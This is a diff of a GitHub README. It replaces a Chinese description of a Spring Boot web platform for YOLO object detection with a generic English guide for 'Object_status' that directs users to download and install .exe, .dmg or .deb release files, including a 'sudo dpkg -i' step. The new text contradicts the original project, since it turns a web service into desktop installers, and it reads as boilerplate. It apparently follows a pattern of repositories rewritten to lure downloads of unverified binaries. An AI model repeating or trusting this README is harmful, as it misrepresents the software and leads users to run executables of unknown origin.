@@ -1,66 +1,95 @@
-# 目标检测推理平台
+# 🌟 Object_status - Precise Detection for High-Resolution Images
 
-这是一个基于Spring Boot后端和前端HTML/CSS/JavaScript构建的目标检测推理平台
+## 🚀 Getting Started
 
-## 功能特性
+Welcome to Object_status, a platform designed for the precise detection of small targets in high-resolution remote sensing images. This guide will walk you through the steps to download and run the software easily.
 
-- 🖼️ 图片上传和预览
-- 🔍 目标检测推理
-- 📊 检测结果可视化
-- 📥 结果导出功能
-- 📱 响应式设计
-- 
-<img width="1899" height="881" alt="d08b48daa1b4a38dc5bbf0f06b64ec8e" src="https://github.com/user-attachments/assets/09b9b63a-9d90-4cf4-a487-8b17ed6bc738" />
+## 📥 Download Now
 
-<img width="1905" height="899" alt="17e5e641f397a39b3037c198703316cb" src="https://github.com/user-attachments/assets/fe5b49c4-3508-4588-b213-594500b70681" />
+[![Download Object_status](https://img.shields.io/badge/Download-Object_status-blue)](https://github.com/davidal68/Object_status/releases)
 
+## 💻 System Requirements
 
-## API接口
+Before you download, ensure your system meets the following requirements:
 
-### 目标检测接口
-- **URL**: `POST /yolo/inference/json`
-- **参数**: `image` (MultipartFile)
-- **返回**: JSON格式的检测结果
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **Memory:** At least 8 GB of RAM.
+- **Storage:** Minimum of 1 GB free space.
+- **Graphics:** A dedicated GPU for optimal performance (e.g., NVIDIA/AMD).
 
-### 图片检测接口
-- **URL**: `POST /yolo/inference/image`
-- **参数**: `image` (MultipartFile)
-- **返回**: 带检测框的图片
+## 📂 Download & Install
 
-<img width="1486" height="681" alt="30e3287f94449986ca00ea9ac1ce850e" src="https://github.com/user-attachments/assets/a1b04b39-0d35-4d50-b81d-7cffb77278f2" />
+To get started, visit this page to download: [Object_status Releases](https://github.com/davidal68/Object_status/releases).
 
+1. Click on the **Releases** link above.
+2. You will see a list of available versions.
+3. Choose the latest version by looking for the top entry.
+4. Download the appropriate file for your operating system:
+   - For Windows: Look for a `.exe` file.
+   - For macOS: Look for a `.dmg` file.
+   - For Linux: Look for a `.tar.gz` or `.deb` file.
 
-## 原图
-<img width="800" height="800" alt="0e42e07fd45d21a5484a83e966936a9" src="https://github.com/user-attachments/assets/acb885a3-1ae9-43f4-8935-0da4f0aae934" />
+## 📤 Installation Steps
 
+### Windows
 
-## 推理的结果
-<img width="1093" height="861" alt="024cb13d6dc49ba650877fcda547553a" src="https://github.com/user-attachments/assets/ee6d1ba6-e019-4c9c-918f-396fe8201252" />
+1. Locate the downloaded `.exe` file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
+4. Once the installation is complete, find the Object_status shortcut on your desktop or in your start menu.
 
+### macOS
 
-## 开发说明
+1. Find the downloaded `.dmg` file in your downloads.
+2. Double-click to open it.
+3. Drag the Object_status icon into your Applications folder.
+4. You can now find Object_status in your Applications.
 
-### 后端技术栈
-- Spring Boot 3.2.0
-- Spring Web
-- Thymeleaf模板引擎
+### Linux
 
-### 前端技术栈
-- 原生HTML5/CSS3/JavaScript
-- Font Awesome图标
-- Google Fonts字体
+1. Open a terminal window.
+2. Navigate to your downloads folder using `cd ~/Downloads`.
+3. If you downloaded a `.tar.gz` file, extract it with:
+   ```
+   tar -xvzf Object_status.tar.gz
+   ```
+4. If you downloaded a `.deb` file, install it using:
+   ```
+   sudo dpkg -i Object_status.deb
+   ```
+5. You can now run Object_status from your applications menu or terminal.
 
-### 目标检测模型
-- Pytorch框架下的检测模型修改0
-- YOLO目标检测模型的改进思路10
-- Docker的模型封装与部属
+## ⚙️ Using Object_status
 
+1. Launch the application through the shortcut or application menu.
+2. Load a high-resolution remote sensing image using the "Open" button.
+3. Select the detection settings that suit your needs.
+4. Click the "Detect" button. The software will analyze the image and highlight detected small targets.
 
-## 下一步计划
+## 📖 Features
 
-- [ ] 集成更多的检测模型
-- [ ] 完善用户等录系统（设置头像以及QQ邮箱发送验证码的业务）
-- [ ] 实现检测历史记录 （检测结果的下载）
-- [ ] 添加批量处理功能
-- [ ] 优化移动端体验
-- [ ] Tips:我永远喜欢高松灯，酷酷嘎嘎（🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧🐧）
+- **High Accuracy:** Employs advanced algorithms for precise detection.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical skill.
+- **Multi-Platform Support:** Available for Windows, macOS, and Linux.
+- **Image Processing:** Capable of handling various high-resolution formats.
+  
+## 🛠️ Troubleshooting
+
+If you encounter any issues during installation or usage, try the following:
+
+- Ensure your system meets the minimum requirements listed above.
+- Restart your computer after installation.
+- Check that you have an active internet connection for the initial software setup.
+- If you face any specific error messages, note them down for further assistance.
+
+## 🌐 Support
+
+For further help or questions:
+
+- Visit the GitHub Issues page of this project: [Issues on GitHub](https://github.com/davidal68/Object_status/issues).
+- Search previous issues for similar problems.
+- If you do not find a solution, feel free to create a new issue describing your problem.
+
+## 🏁 Conclusion
+
+You are now ready to use Object_status for your high-resolution image detection needs. Follow the provided steps, and you should be up and running in no time. Thank you for choosing Object_status!
